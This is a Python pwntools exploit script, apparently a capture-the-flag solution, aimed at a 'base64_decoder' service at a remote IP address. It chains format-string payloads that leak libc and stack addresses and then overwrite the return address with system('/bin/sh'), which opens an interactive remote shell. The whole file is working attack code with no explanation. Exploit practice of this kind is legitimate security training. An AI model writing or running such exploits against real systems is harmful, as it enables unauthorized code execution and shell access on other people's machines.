#!/usr/bin/env python

from pwn import *
import base64

context.log_level = "debug"

elf = "./base64_decoder"

system_off = 0x3fe70
bin_sh_off = 0x15ffcc
printf_off = 0x49670
puts_off = 0x5fca0
puts_off = 0x64da0

printf_got = 0x804a010
puts_got = 0x804a018

#p = process(elf)
p = remote("111.230.149.72", 10013)

p.recvuntil("> ")

payload = p32(puts_got)
payload += "%7$.4s%2$x"
payload = base64.b64encode(payload)
p.sendline(payload)

p.recv(4)
libc_base = u32(p.recv(4))-puts_off
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+system_off
bin_sh_addr = libc_base+bin_sh_off

stack_addr = int(p.recv(8), 0x10)
log.info("stack_addr: "+hex(stack_addr))

count_addr = stack_addr-0x110
ret_addr = stack_addr+0x14
arg_addr = stack_addr+0x1c

system_3byte = system_addr%0x1000000/0x10000
bin_sh_3byte = bin_sh_addr%0x1000000/0x10000
sys_bin_off = bin_sh_3byte-system_3byte
bin_sh_4byte = 0xf7-bin_sh_3byte
system_2b = system_addr%0x10000
bin_sh_2b = bin_sh_addr%0x10000
sys_bin2b_off = bin_sh_2b-system_2b

p.recvuntil("> ")

payload = p32(count_addr)
payload += "%7$n"
payload = base64.b64encode(payload)
p.sendline(payload)

p.recvuntil("> ")

payload = p32(ret_addr+0x2)
payload += p32(arg_addr+0x2)
payload += p32(arg_addr+0x3)
payload += p32(ret_addr)
payload += p32(arg_addr)
payload += "%"+str(system_3byte-len(payload))+"x%7$hhn"
payload += "%"+str(sys_bin_off)+"x%8$hhn"
payload += "%"+str(bin_sh_4byte)+"x%9$hhn"
payload += "%"+str(system_2b-0xf7)+"x%10$hn"
payload += "%"+str(sys_bin2b_off)+"x%11$hn"
payload = base64.b64encode(payload)
p.sendline(payload)

p.recvuntil("> ")

payload = "exit"
p.sendline(payload)

p.interactive()

